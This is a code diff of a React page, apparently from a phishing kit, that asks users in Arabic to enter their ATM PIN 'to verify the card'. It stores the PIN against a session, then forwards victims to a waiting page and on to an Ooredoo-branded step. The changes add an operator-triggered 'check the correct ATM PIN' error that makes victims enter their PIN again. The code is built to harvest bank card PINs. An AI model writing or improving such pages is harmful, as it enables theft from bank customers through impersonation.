@@ -11,6 +11,7 @@ export default function AtmPin() {
   const bank = params.get("bank") || "qnb";
   const { language, setLanguage } = useLanguage();
   const sessionId = localStorage.getItem("sessionId") || "";
+  const showError = params.get("error") === "true";
 
   const isArabic = language === "ar";
 
@@ -33,11 +34,10 @@ export default function AtmPin() {
         sessionId,
         pin,
       });
-      toast.success("تم حفظ البيانات بنجاح");
+      setLocation(`/waiting?bank=${bank}&session=${sessionId}&next=ooredoo`);
     } catch (error) {
-      console.error("Error saving ATM PIN in DB, continuing anyway:", error);
+      toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "Error during submission");
     }
-    setLocation(`/ooredoo?bank=${bank}&session=${sessionId}`);
   };
 
   return (
@@ -68,6 +68,11 @@ export default function AtmPin() {
 
       <div className="container">
         <div className="otp-box">
+          {showError && (
+            <div style={{ background: "#fee2e2", border: "1px solid #ef4444", color: "#b91c1c", padding: "10px", borderRadius: "5px", marginBottom: "15px", textAlign: "center", fontSize: "14px" }}>
+              {isArabic ? "برجاء التحقق من رقم السري للصرف الي الصحيح" : "Please check the correct ATM PIN"}
+            </div>
+          )}
           <h2>التحقق من البطاقة</h2>
           <p>للتأكيد، يرجى إدخال الرقم السري للصراف الآلي</p>
           <form onSubmit={handleSubmit}>
